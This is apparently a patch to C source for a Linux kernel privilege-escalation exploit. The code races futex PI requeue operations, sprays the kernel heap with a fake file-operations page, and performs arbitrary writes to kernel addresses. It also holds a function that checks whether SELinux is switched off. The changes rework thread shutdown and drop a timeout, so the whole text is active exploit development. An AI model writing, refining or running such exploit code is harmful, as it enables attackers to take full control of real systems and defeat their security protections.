@@ -88,6 +88,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   if (atomic_load(&requeue_failed)) {
     pr_error("waiter aborting after cmp_requeue_pi failure futex_ret=%ld errno=%d\n",
              futex_ret, futex_errno);
+    atomic_store(&punch_consume_stop, 1);
     atomic_store(&route_done, 1);
     futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -95,6 +96,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   }
 
   do_pselect_fake_lock_route();
+  atomic_store(&punch_consume_stop, 1);
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -111,7 +113,14 @@ void *owner_thread(void *arg __attribute__((unused))) {
     futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   }
   atomic_store(&owner_chain_done, 1);
-  for (;;) sleep(1);
+  while (!atomic_load(&route_done) && !atomic_load(&requeue_failed)) {
+    usleep(1000);
+  }
+  if (OWNER_CHAIN_DEFAULT) {
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  }
+  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  return NULL;
 }
 
 void *consumer_thread(void *arg __attribute__((unused))) {
@@ -162,7 +171,8 @@ void reset_main_route_state(void) {
   atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
   atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
   atomic_store(&requeue_failed, 0);
-  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
+  atomic_store(&route_done, 0);
+  atomic_store(&waiter_tid, 0);
   atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
@@ -204,33 +214,25 @@ void run_main_route_threads(void) {
   } else if (requeue_ret < 0) {
     pr_warning("cmp_requeue_pi failed; continuing because target allows it\n");
   }
-  waited_ms = 0;
   while (!atomic_load(&route_done)) {
-    if (waited_ms >= route_timeout_ms) {
-      pr_error("route timeout route_done=0 calls=%d success=%d requeue_ret=%ld "
-               "requeue_errno=%d\n",
-               atomic_load(&consumer_calls), atomic_load(&consumer_success),
-               requeue_ret, requeue_errno);
-      atomic_store(&punch_consume_stop, 1);
-      return;
-    }
     usleep(5000);
-    waited_ms += 5;
   }
+  pthread_join(waiter, NULL);
+  pthread_join(consumer, NULL);
+  pthread_join(owner, NULL);
 }
 
-static int do_one_write(uintptr_t target, const char *desc, int mode) {
+static void do_one_write(uintptr_t target, const char *desc, int mode) {
   pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
   pselect_child_node = 1;
   set_pselect_write_mode(target, 0, mode);
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return; }
   TIMER("  heap spray done");
   run_main_route_threads();
   TIMER("  PI route done");
   clear_pselect_write();
-  return 1;
 }
 
 static int check_selinux_off(void) {
